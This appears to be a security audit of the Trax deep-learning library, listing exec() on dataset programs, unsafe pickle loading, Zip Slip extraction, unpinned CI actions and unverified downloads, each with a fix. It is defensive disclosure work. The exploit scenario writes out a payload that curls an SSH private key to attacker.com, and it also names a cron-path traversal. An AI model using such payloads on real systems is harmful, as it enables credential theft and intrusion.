CVE-Eligible

Trax is a Python deep-learning library with significant security concerns. The most critical finding is exec() in trax/data/tf_inputs.py executing Python programs from dataset records with globals() context - if an attacker controls the dataset file, arbitrary code execution at training time is possible. Multiple pickle.load() calls on checkpoint files allow deserialization attacks. The CI/CD pipeline uses unpinned action tags and an end-of-life Python version (3.7). The urllib.request.urlretrieve() call downloads model files without hash verification, and extracts ZIP archives without path traversal protection (Zip Slip). Trax appears to be in maintenance mode (last release 1.4.1), increasing risk from unpatched vulnerabilities.

Confirmed Vulnerabilities

CRITICAL Arbitrary Code Execution via exec() on Dataset-Derived Python Programs TRAX-001
File: trax/data/tf_inputs.py Lines: 2262, 2409 CVSS v3: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) CWE: CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

The execute_mathqa_program() function (line 2244) and code within the @gin.configurable CreateMathQAInputs() function (line 2409) call Python's built-in exec() to execute arbitrary Python code assembled from dataset records. The program argument comes from a MathQA dataset file path (dataset_path) which is user-configurable via gin config. The call passes globals() as the execution context, giving executed code access to all imported modules including os, subprocess, tf. The bare except: clause silently swallows exceptions, masking exploitation.

Evidence

# trax/data/tf_inputs.py, lines 2244-2270
def execute_mathqa_program(problem, program):
  program = '\n'.join(program)   # program assembled from dataset file records
  var_dict = {}
  try:
    exec(program, globals(), var_dict)  # CRITICAL: full globals() context
    if 'answer' in var_dict and is_number(var_dict['answer']):
      return float(var_dict['answer'])
    else:
      return None
  except:  # bare except silently swallows all errors including security exceptions
    return None

# Line 2409 (inside CreateMathQAInputs, also @gin.configurable):
exec(target_values, globals(), var_dict)  # same pattern, assembled from dataset

Exploit Scenario

An attacker places a crafted MathQA-format dataset file at the dataset_path gin config path containing: {"programs": ["import subprocess; subprocess.run(['curl','https://attacker.com/?k='+open('/root/.ssh/id_rsa').read()])"]}. When training runs, the exec fires and executes arbitrary code in the training environment with access to GPU clusters, model weights, and cloud credentials.

Remediation

Replace exec() with a restricted MathQA DSL interpreter. For arithmetic operations, use ast.literal_eval() for constants or implement a whitelist-based expression evaluator. If exec is unavoidable, use a sandboxed subprocess with resource limits and no globals access.

HIGH Unsafe Deserialization via pickle.load() on Checkpoint Files TRAX-002
Files: trax/supervised/training.py (L1258, L1261), trax/layers/base.py (L333), trax/rl/training.py (L154), trax/data/inputs.py (L1115) CVSS v3: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) CWE: CWE-502

Trax uses pickle.load(f) to deserialize model checkpoints, layer weights, and training state from user-controlled output directories. Python pickle deserialization can execute arbitrary code via __reduce__ methods. An attacker who can write a malicious .pkl.gz file to the checkpoint directory (via compromised storage bucket, shared NFS, or malicious GCS path) achieves arbitrary code execution when training resumes.

Evidence

# trax/supervised/training.py, lines 1253-1265
def unpickle_from_file(file_path, gzip=False):
  with tf.io.gfile.GFile(file_path, 'rb') as f:
    if not gzip:
      obj = pickle.load(f)      # No source validation
    else:
      with gzip_lib.GzipFile(fileobj=f) as gzipf:
        obj = pickle.load(gzipf) # Same pattern with gzipped checkpoints
  return obj

# trax/layers/base.py, line 333 (model weights checkpoint)
with gzip.GzipFile(fileobj=f) as gzipf:
    dictionary = pickle.load(gzipf)

Remediation

Replace pickle with numpy .npy/.npz for arrays and JSON for metadata. If pickle must remain for legacy, add HMAC-SHA256 signature verification of checkpoint files before deserialization. Document that checkpoint directories must be trusted sources.

HIGH Zip Slip: Path Traversal in Model Download and Extraction (bert.py) TRAX-003
File: trax/models/research/bert.py Lines: 237-249 CVSS v3: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) CWE: CWE-22 (Path Traversal / Zip Slip)

The PretrainedBERT.download_model() method downloads a ZIP archive and extracts it using zipfile.ZipFile.extractall() without validating member paths. extractall() is documented as vulnerable to Zip Slip. A malicious ZIP containing entries like ../../etc/cron.d/evil can escape the extraction directory to arbitrary filesystem paths. The download URL comes from a hardcoded GCS bucket, but if GCS is misconfigured or a MITM occurs, a malicious ZIP can be delivered.

Evidence

# trax/models/research/bert.py, lines 237-249
urllib.request.urlretrieve(model_link, download_path)
...
with zipfile.ZipFile(download_path, 'r') as zip_ref:
  zip_ref.extractall(download_dir)  # No path validation - Zip Slip vulnerable!

Remediation

def safe_extract(zip_path, extract_dir):
    import os, zipfile
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.infolist():
            target = os.path.realpath(os.path.join(extract_dir, member.filename))
            if not target.startswith(os.path.realpath(extract_dir) + os.sep):
                raise ValueError(f"Zip Slip: {member.filename}")
        zf.extractall(extract_dir)

Also add SHA256 verification of the downloaded ZIP against a known-good hash stored in _MODEL_LINKS.

MEDIUM CI/CD: Unpinned GitHub Actions and EOL Python 3.7 TRAX-004
File: .github/workflows/build.yaml CVSS v3: 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N) CWE: CWE-829, CWE-1104

The trax CI workflow uses actions/checkout@v2 and actions/setup-python@v2 without commit-hash pinning (tag mutation attack vector). The Python matrix is pinned to version 3.7 (EOL June 2023), and TensorFlow to 2.4.x (EOL). No security patches are available for Python 3.7 vulnerabilities.

# .github/workflows/build.yaml
    - uses: actions/checkout@v2          # unpinned tag
    - uses: actions/setup-python@v2      # unpinned tag
      matrix:
        python-version: [3.7]            # EOL since June 2023
        tf-version: ["2.4.*"]            # TF 2.4 EOL

Remediation

Pin actions to SHA hashes. Update Python version matrix to 3.10+. Update TensorFlow to a supported version. Add python_requires='>=3.10' to setup.py.

MEDIUM Model Download Without Hash Verification (bert.py) TRAX-005
File: trax/models/research/bert.py line 237 CVSS v3: 4.8 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N) CWE: CWE-494

urllib.request.urlretrieve(model_link, download_path) downloads model weights without verifying SHA256 hash of the downloaded artifact. Combined with the Zip Slip issue (TRAX-003), this creates a complete exploit chain from network position to arbitrary code execution.

Remediation

Store expected SHA256 hashes in _MODEL_LINKS and verify after download before extraction.

LOW Unpinned Open-Ended Dependency Ranges in setup.py TRAX-006
File: setup.py CVSS v3: 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N) CWE: CWE-1357

All dependencies in setup.py use open-ended version ranges (e.g., 'jax', 'tensorflow>=1.15.0'). This allows installation of vulnerable future versions without any pinning. There is no requirements.txt with pinned versions in the repository root.

Remediation

Add a requirements.txt with pinned versions for reproducible installs. Run pip-audit in CI to detect known CVEs in the dependency tree.
